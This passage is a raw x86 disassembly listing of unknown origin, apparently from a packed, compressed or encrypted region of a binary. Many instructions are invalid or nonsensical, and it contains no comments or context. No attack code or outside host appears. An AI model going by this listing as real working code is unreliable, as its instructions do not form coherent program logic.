  40a4d6:	add    eax,0x1d5c8fce
  40a4db:	jne    0x40a54d
  40a4dd:	jl     0x40a4f2
  40a4df:	mov    esi,0x3c14688f
  40a4e4:	or     al,0x7b
  40a4e6:	sub    ebp,DWORD PTR [edi+0x3c7f6419]
  40a4ec:	hlt    
	...
  40a4f9:	add    BYTE PTR [eax],al
  40a4fb:	add    bl,ch
  40a4fd:	pop    es
  40a4fe:	sahf   
  40a4ff:	(bad)
  40a503:	or     al,0x3b
  40a505:	cmp    ecx,DWORD PTR [edi+0x1c7f4419]
  40a50b:	lock jmp 0x40a515
  40a50e:	jle    0x40a49f
  40a510:	push   0x3b0bfc12
  40a515:	dec    ebx
  40a516:	outs   dx,DWORD PTR ds:[esi]
  40a517:	sbb    DWORD PTR [edi+edi*2],esp
  40a51a:	mov    esp,0x3007ebfb
  40a51f:	inc    esi
  40a520:	outs   dx,DWORD PTR ds:[esi]
  40a521:	add    eax,0x86ff8cbc
  40a526:	and    eax,0x45baad28
  40a52b:	(bad)  
  40a52c:	push   eax
  40a52d:	lahf   
  40a52e:	out    0x18,eax
  40a530:	outs   dx,BYTE PTR ds:[esi]
  40a531:	std    
  40a532:	inc    DWORD PTR [eax+0x26]
  40a535:	ja     0x40a536
  40a537:	cs dec edx
  40a539:	cwde   
  40a53a:	adc    esp,DWORD PTR [esi]
  40a53c:	in     al,dx
  40a53d:	or     ch,al
  40a53f:	push   ebp
  40a540:	dec    esi
  40a541:	adc    bh,bh
  40a543:	bound  esi,QWORD PTR [edi+0x1c]
  40a546:	cmp    ebp,eax
  40a548:	pusha  
  40a549:	add    eax,0x87ccac8b
  40a54e:	cmp    cl,ch
  40a550:	in     eax,0x9
  40a552:	jmp    0x460716
  40a557:	es in  al,0xe
  40a55a:	add    cl,ch
  40a55c:	pusha  
  40a55d:	add    eax,0x248d
	...
  40a56e:	add    BYTE PTR [ebx-0x4b],bh
  40a571:	(bad)  
  40a572:	pop    esp
  40a573:	xchg   ebx,eax
  40a574:	adc    esi,DWORD PTR [ebp-0x7]
  40a577:	imul   ebx,DWORD PTR [eax+0x1356d107],0xffffffff
  40a57e:	mov    esi,0x34830de7
  40a583:	dec    ebx
  40a584:	add    eax,0xdfb70a74
  40a589:	cmp    ebp,DWORD PTR [eax]
  40a58b:	adc    dh,BYTE PTR [di-0x63]
  40a58f:	mov    BYTE PTR [edi+0x6b],bh
  40a592:	jmp    0x1500a3f7
  40a597:	pop    esp
  40a598:	popf   
  40a599:	xor    al,ch
  40a59b:	and    DWORD PTR [edx],edx
  40a59d:	(bad)  
  40a59e:	hlt    
  40a59f:	dec    esp
  40a5a0:	sbb    eax,0x5670279
  40a5a5:	mov    DWORD PTR [ebx+edi*2],esp
  40a5a8:	push   ds
  40a5a9:	pop    es
  40a5aa:	fstp   QWORD PTR cs:0x560e900
  40a5b1:	adc    esp,0x44
  40a5b4:	add    eax,0x4b8f174
  40a5b9:	add    BYTE PTR [eax],al
  40a5bb:	xchg   ebp,eax
  40a5bc:	lods   al,BYTE PTR ds:[esi]
  40a5bd:	(bad)  
  40a5be:	jne    0x40a5c6
  40a5c0:	fiadd  WORD PTR [esi-0x6b]
  40a5c3:	xor    eax,0x3675feed
  40a5c8:	in     eax,dx
  40a5c9:	je     0x40a5d7
  40a5cb:	jb     0x40a559
  40a5cd:	xchg   esp,eax
  40a5ce:	push   DWORD PTR [ebp-0x21]
  40a5d1:	mov    al,BYTE PTR [eax]
	...
  40a5df:	add    BYTE PTR [eax],al
  40a5e1:	add    BYTE PTR [edx-0x31ba74fb],bh
  40a5e7:	mov    BYTE PTR [eax],bh
  40a5e9:	add    BYTE PTR [edi],bh
  40a5eb:	adc    ebp,eax
  40a5ed:	xchg   dl,cl
  40a5ef:	add    eax,0xedffc700
  40a5f4:	(bad)  
  40a5f5:	(bad)  
  40a5f6:	mov    edx,0xbe45c705
  40a5fb:	or     BYTE PTR [eax],al
  40a5fd:	add    BYTE PTR [edx+0x7af044d2],cl
  40a603:	add    eax,0x44270000
  40a608:	out    dx,eax
  40a609:	push   eax
  40a60a:	test   DWORD PTR [ebx-0xd],0xf7440750
  40a611:	push   eax
  40a612:	mov    ch,0x73
  40a614:	adc    edi,edi
  40a616:	das    
  40a617:	add    eax,ebp
  40a619:	loope  0x40a61f
  40a61b:	stc    
  40a61c:	inc    BYTE PTR [ebx+0x73ffdd77]
  40a622:	sub    DWORD PTR [ebp+edi*2+0x2c813af8],eax
  40a629:	and    DWORD PTR [edi-0xb],0xffffffff
  40a62d:	je     0x40a66b
  40a62f:	test   BYTE PTR [ebp-0x10],bh
  40a632:	cmp    al,BYTE PTR [ecx-0x12d000e0]
  40a638:	(bad)  
  40a639:	jne    0x40a651
  40a63b:	fnstsw WORD PTR [edx*4+0x75fef8b5]
  40a642:	arpl   WORD PTR [edx+0x7516],si
	...
  40a654:	add    BYTE PTR [edi-0x3a],dl
  40a657:	rcl    DWORD PTR [esp+edi*8-0xc8ae939],1
  40a65e:	iret   
  40a65f:	nop
  40a660:	or     edi,ebx
  40a662:	push   DWORD PTR [eax-0x1]
  40a665:	in     al,0xdf
  40a667:	nop
  40a668:	test   ebx,0xd4ff7b32
  40a66e:	out    dx,eax
  40a66f:	nop
  40a670:	repz mov ebx,0xc4ff7b4a
  40a676:	call   DWORD PTR [eax+0x7b42cbef]
  40a67c:	push   DWORD PTR [edi+ebx*2-0x5ea300f6]
  40a683:	test   al,0xfe
  40a685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a686:	pop    ds
  40a687:	cmp    BYTE PTR [ebp-0x71],0x1e
  40a68b:	(bad)  
  40a68c:	sbb    eax,0x75161e09
  40a691:	pop    edi
  40a692:	inc    esi
  40a693:	outs   dx,DWORD PTR ds:[esi]
  40a694:	xchg   esp,eax
  40a695:	test   BYTE PTR [edi],bh
  40a697:	test   eax,0x7d17dff
  40a69c:	call   0xff56618a
  40a6a1:	stc    
  40a6a2:	sbb    eax,0x46577516
  40a6a7:	adc    DWORD PTR [esp+ebx*2+0x57751667],0x76
  40a6af:	es xchg edi,eax
  40a6b1:	dec    esp
  40a6b2:	ja     0x40a679
  40a6b4:	or     cl,BYTE PTR [ebp+0x2f]
  40a6b7:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  40a6c6:	add    BYTE PTR [eax],al
  40a6c8:	cmp    eax,0x955f1687
  40a6cd:	push   ebp
  40a6ce:	inc    ecx
  40a6cf:	adc    BYTE PTR [ebx-0xf],ah
  40a6d2:	mov    ch,ah
  40a6d4:	loopne 0x40a73f
  40a6d6:	pop    ds
  40a6d7:	push   esi
  40a6d8:	sbb    al,0x5
  40a6da:	fmul   QWORD PTR [ebx]
  40a6dc:	or     edi,DWORD PTR [eax+0x6e]
  40a6df:	push   ss
  40a6e0:	or     al,0x7e
  40a6e2:	lods   al,BYTE PTR ds:[esi]
  40a6e3:	pavgb  mm2,QWORD PTR [ecx-0x48e0cac]
  40a6ea:	add    BYTE PTR [ebx+eiz*2],0x5
  40a6ee:	jmp    0xe183c2a8
  40a6f3:	add    esp,esp
  40a6f5:	cdq    
  40a6f6:	loopne 0x40a723
  40a6f8:	(bad)  
  40a6f9:	jne    0x40a721
  40a6fb:	push   ss
  40a6fc:	pushf  
  40a6fd:	leave  
  40a6fe:	and    BYTE PTR [ebx+eiz*2],al
  40a701:	add    eax,0xd1e88e9
  40a706:	mov    ecx,0x10fd3616
  40a70b:	(bad)  
  40a70d:	paddd  mm1,QWORD PTR [ebx-0x6795eeda]
  40a714:	lods   al,BYTE PTR ds:[esi]
  40a715:	add    al,0x75
  40a717:	pop    es
  40a718:	loopne 0x40a6ab
  40a71a:	in     al,0x2
  40a71c:	adc    DWORD PTR [edi],eax
  40a71e:	push   0xffffff97
  40a720:	mov    BYTE PTR [esi],al
  40a722:	pop    edi
  40a723:	or     cl,bl
  40a725:	add    eax,0xaf6303e9
  40a72a:	scas   eax,DWORD PTR es:[edi]
  40a72b:	inc    edx
	...
  40a738:	add    BYTE PTR [eax],al
  40a73a:	add    BYTE PTR [ebx+0x5],ch
  40a73d:	ins    BYTE PTR es:[edi],dx
  40a73e:	mov    edi,0x8fb5b474
  40a743:	pop    esp
  40a744:	sbb    eax,0xf5c73ad
  40a749:	push   0xffffff97
  40a74b:	dec    esp
  40a74c:	push   es
  40a74d:	adc    eax,0x1d455800
  40a752:	or     cl,BYTE PTR [ebx]
  40a754:	add    eax,0xaf6303e9
  40a759:	scas   eax,DWORD PTR es:[edi]
  40a75a:	inc    edx
  40a75b:	imul   eax,DWORD PTR ds:0x928976a,0x0
  40a762:	sti    
  40a763:	das    
  40a764:	add    BYTE PTR [ebp+0x71],0xd7
  40a768:	pushf  
  40a769:	pop    ss
  40a76a:	data16 in al,0x6
  40a76d:	call   0xff4f3a33
  40a772:	les    edx,FWORD PTR fs:[esi]
  40a775:	push   eax
  40a776:	dec    esi
  40a777:	in     al,dx
  40a778:	push   es
  40a779:	call   0xff4f17af
  40a77e:	jo     0x40a72c
  40a780:	and    ch,bl
  40a782:	aam    0xdd
  40a784:	enter  0x99f7,0x77
  40a788:	cwde   
  40a789:	pop    es
  40a78a:	adc    DWORD PTR [esi],esp
  40a78c:	je     0x40a78d
  40a78e:	push   ds
  40a78f:	fmul   st,st(0)
  40a791:	jecxz  0x40a7f7
  40a793:	add    al,0x17
  40a795:	push   eax
  40a796:	cmp    DWORD PTR [edi+ecx*1-0x24770e8b],0xffffff91
  40a79e:	inc    BYTE PTR [eax]
	...
  40a7ac:	add    BYTE PTR [eax],al
  40a7ae:	push   edi
  40a7af:	add    BYTE PTR [ebp-0xf],0xf0
  40a7b3:	pcmpeqw mm4,mm1
  40a7b6:	dec    eax
  40a7b7:	xor    bh,dl
  40a7b9:	out    0x6f,al
  40a7bb:	cmp    BYTE PTR [ebp-0x3b],0x61
  40a7bf:	cwde   
  40a7c0:	sbb    eax,0x5016c564
  40a7c5:	into   
  40a7c6:	in     eax,dx
  40a7c7:	or     bh,bh
  40a7c9:	cmp    al,0x6b
  40a7cb:	push   cs
  40a7cc:	jne    0x40a7bf
  40a7ce:	cmp    BYTE PTR [edi-0x3],bl
  40a7d1:	mov    dh,0x4f
  40a7d3:	add    BYTE PTR [ebp-0x4f],0x10
  40a7d7:	pcmpeqw mm6,mm1
  40a7da:	mov    BYTE PTR [esi-0x6],bl
  40a7dd:	sahf   
  40a7de:	ja     0x40a762
  40a7e0:	jge    0x40a773
  40a7e2:	pusha  
  40a7e3:	cwde   
  40a7e4:	or     DWORD PTR [ecx+0x60],edx
  40a7e7:	add    eax,0x584a0000
  40a7ec:	enter  0x32c2,0x2
  40a7f0:	lea    eax,[ebp-0x4e]
  40a7f3:	push   edx
  40a7f4:	(bad)  
  40a7f5:	jne    0x40a785
  40a7f7:	stc    
  40a7f8:	je     0x40a806
  40a7fa:	jge    0x40a87b
  40a7fc:	pop    es
  40a7fd:	call   0x3f9f7c
  40a802:	jns    0x40a87b
  40a804:	test   DWORD PTR [eax],0xb7fc17
  40a80a:	or     al,BYTE PTR [edx]
  40a80c:	add    BYTE PTR [esi+0x33],bl
  40a80f:	les    eax,FWORD PTR [edi]
	...
  40a821:	jg     0x40a872
  40a823:	not    DWORD PTR [eax-0x73]
  40a826:	jg     0x40a82f
  40a828:	call   0x3f3aef
  40a82d:	push   ecx
  40a82e:	bnd call 0x42632f
  40a834:	call   edi
  40a836:	stc    
  40a837:	out    0xe7,eax
  40a839:	sbb    cl,bh
  40a83b:	(bad)  
  40a83c:	cmp    eax,DWORD PTR [edi]
  40a83e:	(bad)  
  40a83f:	je     0x40a846
  40a841:	arpl   WORD PTR [ecx],ax
  40a843:	add    BYTE PTR [eax],al
  40a845:	mov    al,BYTE PTR [ebp+edi*2+0x237784fc]
  40a84c:	lea    eax,[edi+0x1]
  40a84f:	push   eax
  40a850:	jmp    DWORD PTR [edi]
  40a852:	adc    edi,esp
  40a854:	or     eax,0x8dfef1fb
  40a859:	inc    edi
  40a85a:	add    DWORD PTR [eax-0x1],edx
  40a85d:	aaa    
  40a85e:	adc    edi,esp
  40a860:	cmp    dh,BYTE PTR [eax-0x7872010f]
  40a866:	stc    
  40a867:	dec    edi
  40a868:	push   DWORD PTR [edi+0x9]
  40a86b:	out    0x2e,eax
  40a86d:	add    cl,bh
  40a86f:	dec    BYTE PTR [ebp+0x500bd963]
  40a875:	cmp    al,0xf2
  40a877:	sti    
  40a878:	out    0x10,eax
  40a87a:	mov    BYTE PTR [ebx],dl
  40a87c:	(bad)  
  40a87d:	(bad)  
  40a87f:	adc    ecx,DWORD PTR [ebp-0x14c6962]
	...
  40a891:	add    BYTE PTR [eax],al
  40a893:	add    BYTE PTR [esi+0x18c41b26],dl
  40a899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a89a:	adc    cl,BYTE PTR [ecx+0x4580baa6]
  40a8a0:	or     ecx,DWORD PTR [edi+0x12]
  40a8a3:	jne    0x40a910
  40a8a5:	(bad)  
  40a8a6:	pop    eax
  40a8a7:	sti    
  40a8a8:	hlt    
  40a8a9:	ret    
  40a8aa:	jl     0x40a8f1
  40a8ac:	sti    
  40a8ad:	lahf   
  40a8ae:	nop
  40a8af:	out    dx,eax
  40a8b0:	arpl   WORD PTR [edx-0x6a],cx
  40a8b3:	sbb    BYTE PTR [esi-0x36],0x3
  40a8b7:	je     0x40a8ff
  40a8b9:	lahf   
  40a8ba:	nop
  40a8bb:	out    0x63,eax
  40a8bd:	jb     0x40a869
  40a8bf:	add    BYTE PTR [esi-0xa],0x3
  40a8c3:	je     0x40a907
  40a8c5:	xchg   bh,cl
  40a8c7:	cmp    esp,DWORD PTR [edx]
  40a8c9:	push   ds
  40a8ca:	adc    dh,BYTE PTR [ebp-0x4d]
  40a8cd:	test   BYTE PTR [esi+0x68],0x63
  40a8d1:	push   ds
  40a8d2:	(bad)  
  40a8d3:	mov    edi,0x2a9b3c16
  40a8d8:	push   edi
  40a8d9:	fld    QWORD PTR [ebx]
  40a8db:	call   DWORD PTR [esi]
  40a8dd:	sbb    ebp,DWORD PTR cs:[edx+0xb031dfb]
  40a8e4:	mov    ds:0x306800b1,eax
  40a8e9:	add    al,ch
  40a8eb:	jmp    FWORD PTR [ebp-0x2f]
  40a8ee:	adc    ebp,eax
  40a8f0:	retf   0x3c6
  40a8f3:	add    BYTE PTR [eax+0x5e],ch
  40a8f6:	xchg   edi,eax
  40a8f7:	sub    eax,0x0
	...
  40a904:	add    BYTE PTR [eax],al
  40a906:	add    bl,cl
  40a908:	add    eax,0x4b3c03e9
  40a90d:	sahf   
  40a90e:	cwde   
  40a90f:	pop    eax
  40a910:	sbb    eax,0xc3c761c
  40a915:	mov    ds,WORD PTR [eax-0x3f3bc]
  40a91b:	inc    esp
  40a91c:	cmp    DWORD PTR [ebx+0x12],ebx
  40a91f:	and    al,0xc
  40a921:	cld    
  40a922:	pop    ds
  40a923:	sbb    al,0x92
  40a925:	fcomp  QWORD PTR [ebx]
  40a927:	and    dh,BYTE PTR [edi+0x66]
  40a92a:	adc    cl,BYTE PTR [edx+edx*4]
  40a92d:	push   eax
  40a92e:	adc    cl,BYTE PTR [esi-0x2ea6bf07]
  40a934:	or     ecx,DWORD PTR [esi+0x12]
  40a937:	outs   dx,BYTE PTR ds:[esi]
  40a938:	adc    eax,0xbd64651
  40a93d:	adc    ch,BYTE PTR ds:[esi+0x19]
  40a941:	inc    ecx
  40a942:	dec    esi
  40a943:	test   BYTE PTR [ebx],0x2e
  40a946:	adc    cl,BYTE PTR [esi+0x1d]
  40a949:	adc    DWORD PTR [esi-0xa],edx
  40a94c:	or     ebx,DWORD PTR [esi]
  40a94e:	shl    ecx,0x89
  40a951:	adc    BYTE PTR [ebx],al
  40a953:	aaa    
  40a954:	std    
  40a955:	loope  0x40a970
  40a957:	fs cmp dh,0x10
  40a95b:	lods   al,BYTE PTR ds:[esi]
  40a95c:	or     esi,DWORD PTR [edx-0x38]
  40a95f:	lods   al,BYTE PTR ds:[esi]
  40a960:	stos   BYTE PTR es:[edi],al
  40a961:	pop    ds
  40a962:	inc    ebp
  40a963:	imul   eax,DWORD PTR ds:0x87877e94,0xffffffad
  40a96a:	adc    BYTE PTR [eax],al
	...
  40a978:	add    BYTE PTR [eax],al
  40a97a:	mov    WORD PTR [ecx+0x4d181bec],ss
  40a980:	(bad)  
  40a981:	adc    DWORD PTR [eax+0x45],ebp
  40a984:	push   esp
  40a985:	shl    edi,1
  40a987:	rol    esp,0xb4
  40a98a:	test   BYTE PTR ds:0xb64116d,dh
  40a990:	add    BYTE PTR [ebx+esi*2],bh
  40a993:	or     dh,BYTE PTR [ebp-0x23]
  40a996:	js     0x40a9ea
  40a998:	mov    fs,WORD PTR [esi+0x15bffe72]
  40a99e:	push   edx
  40a99f:	or     al,0x75
  40a9a1:	loope  0x40a9f6
  40a9a3:	nop
  40a9a4:	sti    
  40a9a5:	sub    edx,0x2e86ff08
  40a9ab:	dec    ebx
  40a9ac:	jne    0x40a987
  40a9ae:	enter  0xf0a,0x86
  40a9b2:	mov    cl,0xa
  40a9b4:	jne    0x40a993
  40a9b6:	jae    0x40a948
  40a9b8:	pop    es
  40a9b9:	push   ecx
  40a9ba:	adc    DWORD PTR [edx-0x1],0xfb90725e
  40a9c1:	inc    ecx
  40a9c2:	scas   eax,DWORD PTR es:[edi]
  40a9c3:	jns    0x40a9c4
  40a9c5:	dec    esi
  40a9c6:	cmp    BYTE PTR [edi+0x8],al
  40a9c9:	jmp    0x692d2983
  40a9ce:	fwait
  40a9cf:	push   ecx
  40a9d0:	(bad)  
  40a9d1:	ss jb  0x40aa16
  40a9d4:	test   DWORD PTR [ecx+0x71],esi
  40a9d7:	or     bh,bh
  40a9d9:	jmp    0x7240af3e
	...
  40a9ea:	add    BYTE PTR [eax],al
  40a9ec:	add    BYTE PTR [esi+edi*8+0x1db290a],bl
  40a9f3:	adc    cl,0x60
  40a9f6:	nop
  40a9f7:	add    al,0x10
  40a9f9:	lock add eax,0x9053e900
  40a9ff:	or     eax,DWORD PTR [ecx]
  40aa01:	arpl   WORD PTR [ebp-0x1],sp
  40aa04:	out    dx,al
  40aa05:	xchg   edi,eax
  40aa06:	dec    edx
  40aa07:	jne    0x40a9ff
  40aa09:	call   0x5f68d661
  40aa0e:	or     dh,BYTE PTR [ebp-0x1b]
  40aa11:	pop    eax
  40aa12:	pop    esp
  40aa13:	cwde   
  40aa14:	into   
  40aa15:	push   ebx
  40aa16:	push   ds
  40aa17:	or     eax,0x2bb51200
  40aa1c:	inc    ecx
  40aa1d:	jp     0x40aa14
  40aa1f:	je     0x40aa2d
  40aa21:	and    bl,BYTE PTR [eax-0x70fa0069]
  40aa27:	test   BYTE PTR [eax+0x68fef504],bh
  40aa2d:	and    al,0x7
  40aa2f:	add    BYTE PTR [eax],al
  40aa31:	mov    DWORD PTR [ebx-0xb1a013e],0x9308e84f
  40aa3b:	(bad)  
  40aa3c:	push   DWORD PTR [edi-0x6a013d7d]
  40aa42:	cmc    
  40aa43:	dec    edi
  40aa44:	dec    DWORD PTR [edi-0x42]
  40aa47:	std    
  40aa48:	inc    DWORD PTR [ebp-0x599b212]
  40aa4e:	add    eax,0x8589
	...
  40aa5f:	add    dh,dl
  40aa61:	repz (bad) 
  40aa63:	dec    edx
  40aa65:	add    al,0x84
  40aa67:	repz cli 
  40aa69:	add    eax,0xc08f8d00
  40aa6e:	std    
  40aa6f:	call   DWORD PTR [ebp-0x35effe13]
  40aa75:	add    eax,0x8b077400
  40aa7a:	inc    ecx
  40aa7b:	sub    al,0xa
  40aa7d:	outs   dx,BYTE PTR ds:[esi]
  40aa7e:	mov    cl,0x2c
  40aa80:	or     eax,DWORD PTR [esi]
  40aa82:	call   0x4686b2
  40aa87:	or     edi,DWORD PTR [edx+0x73]
  40aa8a:	add    al,0xe9
  40aa8c:	adc    eax,DWORD PTR [esi]
  40aa8e:	add    BYTE PTR [eax],al
  40aa90:	pop    es
  40aa91:	xchg   ebx,eax
  40aa92:	sar    esi,0x85
  40aa95:	stc    
  40aa96:	mov    WORD PTR [edx+0x76],es
  40aa99:	push   ecx
  40aa9a:	addr16 mov ah,0x56
  40aa9d:	inc    eax
  40aa9e:	jmp    edi
  40aaa0:	arpl   WORD PTR [edx],sp
  40aaa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaa3:	push   DWORD PTR [esi+eiz*1+0x43]
  40aaa7:	jne    0x40ab0f
  40aaa9:	xor    eax,0x1c630080
  40aaae:	push   cs
  40aaaf:	jne    0x40ab20
  40aab1:	inc    esi
  40aab2:	mov    al,ds:0xfb58549e
  40aab7:	mov    edi,0xc59b0fd6
  40aabc:	jnp    0x40aa9b
  40aabe:	add    edi,edi
  40aac0:	mov    dh,0x22
  40aac2:	sbb    ecx,DWORD PTR [ecx]
	...
  40aad0:	add    BYTE PTR [eax],al
  40aad2:	add    bl,bl
  40aad4:	ja     0x40aae5
  40aad6:	jmp    0x40ab31
  40aad8:	hlt    
  40aad9:	add    edi,edi
  40aadb:	scas   al,BYTE PTR es:[edi]
  40aadc:	sbb    bl,BYTE PTR [ebx]
  40aade:	std    
  40aadf:	hlt    
  40aae0:	(bad)  
  40aae1:	push   cs
  40aae2:	(bad)  
  40aae3:	out    dx,al
  40aae4:	pop    esp
  40aae5:	push   cs
  40aae6:	dec    DWORD PTR [edx+edx*4]
  40aae9:	mov    cl,0x2b
  40aaeb:	mov    cl,0x4e
  40aaed:	sbb    eax,DWORD PTR [ecx-0x25]
  40aaf0:	scas   eax,DWORD PTR es:[edi]
  40aaf1:	push   cs
  40aaf2:	push   eax
  40aaf3:	hlt    
  40aaf4:	xor    ebx,esi
  40aaf6:	dec    edi
  40aaf7:	in     al,dx
  40aaf8:	dec    ecx
  40aaf9:	sti    
  40aafa:	out    0xe9,eax
  40aafc:	enter  0xff0e,0xcb
  40ab00:	adc    dh,BYTE PTR [edi-0x1]
  40ab03:	aam    0xc3
  40ab05:	ret    0x218c
  40ab08:	xor    bh,BYTE PTR [ebp+eax*4+0xf]
  40ab0c:	jmp    0x69fdaa1f
  40ab11:	repz (bad) 
  40ab13:	out    dx,al
  40ab14:	mov    dl,0xd
  40ab16:	jmp    FWORD PTR [esi+esi*8+0x1e63664e]
  40ab1d:	cli    
  40ab1e:	mov    edi,0xc59b4617
  40ab23:	dec    ebx
  40ab24:	pop    ebp
  40ab25:	add    edi,edi
  40ab27:	push   ss
  40ab28:	add    eax,0x70d21bf5
  40ab2d:	fimul  WORD PTR [esi]
  40ab2f:	jl     0x40ab83
  40ab31:	popf   
  40ab32:	or     eax,0x1c390874
	...
  40ab43:	add    BYTE PTR [eax],al
  40ab45:	add    BYTE PTR [edx+0x70],ch
  40ab48:	(bad)  
  40ab49:	push   cs
  40ab4a:	adc    esi,DWORD PTR [ebp+0x1d6498bd]
  40ab50:	dec    ecx
  40ab51:	push   cs
  40ab52:	push   esp
  40ab53:	or     cl,al
  40ab55:	push   ss
  40ab56:	lock pop es
  40ab58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab59:	sbb    dh,0x42
  40ab5c:	lahf   
  40ab5d:	push   cs
  40ab5e:	cmp    al,0xb5
  40ab60:	xchg   ebp,eax
  40ab61:	pop    eax
  40ab62:	test   DWORD PTR [esi],0x9a3b0e8e
  40ab68:	or     eax,DWORD PTR [ebx+eiz*2]
  40ab6b:	sub    BYTE PTR [ecx+0x75ece7fe],0xe
  40ab72:	adc    al,0x8
  40ab74:	xor    al,0x4f
  40ab76:	or     eax,0x831b6608
  40ab7b:	mov    ds:0x51fc03e8,al
  40ab80:	xchg   ecx,eax
  40ab81:	or     eax,0x464107f4
  40ab86:	rol    BYTE PTR [edi],1
  40ab88:	inc    esi
  40ab89:	cmp    al,0x21
  40ab8b:	stc    
  40ab8c:	call   0x68599549
  40ab91:	inc    edi
  40ab92:	adc    eax,DWORD PTR [edi]
  40ab94:	cs push cs
  40ab96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab97:	and    DWORD PTR [ecx+0xd],0x3e907c4
  40ab9e:	arpl   WORD PTR ds:0xfc68c862,ax
  40aba4:	sub    BYTE PTR [edi+0x3c18567],dl
	...
  40abb6:	add    BYTE PTR [eax],al
  40abb8:	add    BYTE PTR [esi],ch
  40abba:	add    dl,BYTE PTR [eax]
  40abbc:	cld    
  40abbd:	arpl   WORD PTR ds:0x4ef8e900,ax
  40abc3:	sub    al,0xa8
  40abc5:	pusha  
  40abc6:	or     BYTE PTR [ebp-0xb],dh
  40abc9:	push   0x6ede96d6
  40abce:	jle    0x40ab55
  40abd0:	xchg   ecx,eax
  40abd1:	gs or  bh,bh
  40abd4:	inc    ecx
  40abd5:	popf   
  40abd6:	add    al,0x0
  40abd8:	jmp    0xc0032dc2
  40abdd:	outs   dx,BYTE PTR ds:[esi]
  40abde:	push   es
  40abdf:	push   eax
  40abe0:	sar    DWORD PTR [eax-0x3351008e],0x80
  40abe7:	ret    0x56a7
  40abea:	push   es
  40abeb:	push   eax
  40abec:	sahf   
  40abed:	xchg   esp,eax
  40abee:	dec    ebp
  40abef:	(bad)  
  40abf0:	xchg   esi,eax
  40abf1:	sbb    ax,0x5e5
  40abf5:	addr16 add eax,0x7936c89
  40abfb:	(bad)  
  40abfc:	jle    0x40ac25
  40abfe:	clc    
  40abff:	sub    DWORD PTR [edi+0x5c00055f],0xffffff94
  40ac06:	inc    ebx
  40ac07:	(bad)  
  40ac08:	push   si
  40ac0a:	push   cs
  40ac0b:	add    bh,cl
  40ac0d:	pusha  
  40ac0e:	add    eax,0x76dce600
  40ac13:	add    cl,ch
  40ac15:	pusha  
  40ac16:	js     0x40abad
  40ac18:	sub    edx,DWORD PTR [ebp+0x6]
  40ac1b:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  40ac2b:	add    BYTE PTR [ecx+0x32c14fda],ah
  40ac31:	fld    DWORD PTR [eax-0x17]
  40ac34:	push   0x60e9644d
  40ac39:	cli    
  40ac3a:	mov    edi,0x751a6294
  40ac3f:	fs sub al,0x43
  40ac42:	dec    BYTE PTR [esi]
  40ac44:	pop    esi
  40ac45:	js     0x40ac89
  40ac47:	add    BYTE PTR [esi-0x514b98ae],cl
  40ac4d:	inc    ebx
  40ac4e:	jmp    edi
  40ac50:	sub    al,0x5d
  40ac52:	(bad)  
  40ac53:	inc    DWORD PTR [ecx-0x4efd8b3e]
  40ac59:	pop    ebp
  40ac5a:	mov    WORD PTR [ebp-0x10738],ss
  40ac60:	inc    DWORD PTR [ebx+0x2b]
  40ac63:	mov    DWORD PTR [edi],eax
  40ac65:	scas   al,BYTE PTR es:[edi]
  40ac66:	std    
  40ac67:	call   FWORD PTR [ebp-0x74d73a96]
  40ac6d:	add    edi,edi
  40ac6f:	jne    0x40acaf
  40ac71:	jmp    0xb5fe:0xf8fd9698
  40ac78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac79:	clc    
  40ac7a:	(bad)  
  40ac7b:	(bad)  
  40ac7c:	jp     0x40ac67
  40ac7e:	loopne 0x40ac16
  40ac80:	int    0xf8
  40ac82:	mov    BYTE PTR [ebp-0x10776],al
  40ac88:	dec    edx
  40ac89:	imul   eax,DWORD PTR [edx+0x3c],0xb5ff014b
	...
  40ac9c:	add    BYTE PTR [eax],al
  40ac9e:	add    BYTE PTR [edx-0x8],bl
  40aca1:	(bad)  
  40aca2:	jmp    edx
  40aca4:	je     0x40ad0a
  40aca6:	add    dl,bh
  40aca8:	or     al,0xbf
  40acaa:	je     0x40aca5
  40acac:	imul   ecx,DWORD PTR [eax+0x3c],0xb5ff01cb
  40acb3:	retf   0xfef7
  40acb6:	call   FWORD PTR [ebp-0x5c17f891]
  40acbc:	idiv   dh
  40acbe:	jmp    DWORD PTR [edx]
  40acc0:	mov    ebp,0x877dff91
  40acc5:	test   dl,al
  40acc7:	jl     0x40acc2
  40acc9:	(bad)  
  40acca:	push   eax
  40accb:	pop    ebp
  40accc:	scas   eax,DWORD PTR es:[edi]
  40accd:	mov    ebx,0xbef63fe
  40acd2:	call   0x442d49
  40acd7:	(bad)  
  40acd9:	sti    
  40acda:	test   BYTE PTR [esi],ah
  40acdc:	pop    es
  40acdd:	or     edi,edi
  40acdf:	xchg   esp,eax
  40ace0:	enter  0xfe4e,0x8c
  40ace4:	push   ss
  40ace5:	sbb    ah,BYTE PTR [edi+edi*8]
  40ace8:	sbb    eax,DWORD PTR [ebx]
  40acea:	push   DWORD PTR [esi+0x74ff0a63]
  40acf0:	inc    ebx
  40acf1:	jg     0x40ac85
  40acf3:	ins    BYTE PTR es:[edi],dx
  40acf4:	ss cmp eax,0xb01c5bc2
  40acfa:	mov    cl,BYTE PTR [edi-0x3c]
  40acfd:	nop
  40acfe:	or     ecx,DWORD PTR [ebx-0x58]
  40ad01:	jno    0x40ad02
	...
  40ad0f:	add    BYTE PTR [eax],al
  40ad11:	add    BYTE PTR [eax+ebp*8+0x42],cl
  40ad15:	je     0x40ad6b
  40ad17:	ds mov ah,0xfe
  40ad1a:	mov    dh,0xf6
  40ad1c:	sbb    ch,BYTE PTR [ebx-0x17f563cb]
  40ad22:	mov    edx,0x1aff0b80
  40ad27:	mov    cl,0xfb
  40ad29:	push   DWORD PTR [edi+0x1f831877]
  40ad2f:	jnp    0x40accf
  40ad31:	(bad)  
  40ad32:	jp     0x40ad01
  40ad34:	or     DWORD PTR [ebp+0x5b],esi
  40ad37:	push   esi
  40ad38:	jg     0x40acc9
  40ad3a:	cld    
  40ad3b:	arpl   WORD PTR [ebp+0x45],di
  40ad3e:	test   eax,0xe676feec
  40ad44:	sbb    bh,BYTE PTR [edi+0x6a0b4be4]
